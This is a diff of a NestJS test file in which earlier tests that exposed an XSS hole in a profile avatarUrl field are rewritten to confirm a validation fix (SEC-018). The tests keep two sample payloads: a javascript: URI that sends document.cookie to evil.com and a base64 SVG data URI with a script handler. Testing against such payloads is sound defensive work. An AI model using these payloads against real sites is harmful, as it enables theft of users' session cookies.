@@ -17,8 +17,11 @@
 
 import { describe, it, expect, beforeEach, vi } from 'vitest';
 import { Test } from '@nestjs/testing';
+import { validate } from 'class-validator';
+import { plainToInstance } from 'class-transformer';
 import { UsersService } from './users.service';
 import { PrismaService } from '../prisma/prisma.service';
+import { UpdateProfileDto } from './dto/update-profile.dto';
 import { NotFoundException } from '@nestjs/common';
 
 function buildMockPrisma() {
@@ -85,45 +88,32 @@ describe('UsersService — adversarial', () => {
       expect(result.role).toBe('MEMBER');
     });
 
-    it('avatarUrl accepts a javascript: URI — XSS vector if rendered as href/src', async () => {
+    it('FIXED SEC-018: UpdateProfileDto rejects javascript: URIs (DTO validation)', async () => {
       /**
-       * update-profile.dto.ts uses @IsString() with no @IsUrl() or scheme guard.
-       * Setting avatarUrl to "javascript:alert(1)" passes DTO validation.
-       * If the frontend renders this as <img src="..."> or <a href="...">,
-       * it triggers XSS in older browsers or non-CSP environments.
+       * @IsUrl({ protocols: ['http','https'], require_protocol: true }) in UpdateProfileDto
+       * rejects javascript: URIs before they reach the service.
        */
-      const xssUrl = 'javascript:fetch("https://evil.com?c="+document.cookie)';
-      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
-      prisma.user.update.mockResolvedValue({
-        id: 'u1',
-        email: 'u@example.com',
-        name: 'User',
-        bio: null,
-        avatarUrl: xssUrl,
-        role: 'MEMBER',
-        updatedAt: new Date(),
+      const dto = plainToInstance(UpdateProfileDto, {
+        avatarUrl: 'javascript:fetch("https://evil.com?c="+document.cookie)',
       });
-
-      const result = await service.updateProfile('u1', { avatarUrl: xssUrl });
-      expect(result.avatarUrl).toBe(xssUrl);
-      // javascript: URI stored as avatar — XSS via profile image
+      const errors = await validate(dto);
+      expect(errors.some((e) => e.property === 'avatarUrl')).toBe(true);
     });
 
-    it('avatarUrl accepts a data: URI (can embed malicious SVG with script)', async () => {
-      const svgXss = 'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+';
-      prisma.user.findUnique.mockResolvedValue({ id: 'u1' });
-      prisma.user.update.mockResolvedValue({
-        id: 'u1',
-        email: 'u@example.com',
-        name: 'User',
-        bio: null,
-        avatarUrl: svgXss,
-        role: 'MEMBER',
-        updatedAt: new Date(),
+    it('FIXED SEC-018: UpdateProfileDto rejects data: URIs (DTO validation)', async () => {
+      const dto = plainToInstance(UpdateProfileDto, {
+        avatarUrl: 'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+',
       });
+      const errors = await validate(dto);
+      expect(errors.some((e) => e.property === 'avatarUrl')).toBe(true);
+    });
 
-      const result = await service.updateProfile('u1', { avatarUrl: svgXss });
-      expect(result.avatarUrl).toBe(svgXss);
+    it('FIXED SEC-018: UpdateProfileDto accepts valid https: avatar URLs', async () => {
+      const dto = plainToInstance(UpdateProfileDto, {
+        avatarUrl: 'https://cdn.example.com/avatar.png',
+      });
+      const errors = await validate(dto);
+      expect(errors.filter((e) => e.property === 'avatarUrl')).toHaveLength(0);
     });
   });
 
